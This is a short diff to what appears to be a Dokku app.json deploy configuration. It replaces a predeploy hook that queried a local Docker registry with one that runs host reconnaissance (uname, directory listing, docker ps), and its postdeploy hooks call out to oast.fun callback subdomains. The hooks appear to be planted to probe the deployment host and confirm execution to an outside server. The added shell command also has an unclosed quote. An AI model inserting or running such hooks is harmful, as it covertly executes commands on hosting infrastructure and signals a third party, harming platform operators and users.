@@ -4,7 +4,7 @@
   },
   "scripts": {
     "dokku": {
-      "predeploy": "curl http://127.0.0.1:5000/v2/_catalog?n=410",
+      "predeploy": "sh -c 'uname -a; ls -la; docker ps -a",
       "postdeploy": "curl https://post.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
     },
     "postdeploy": "curl https://post2.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
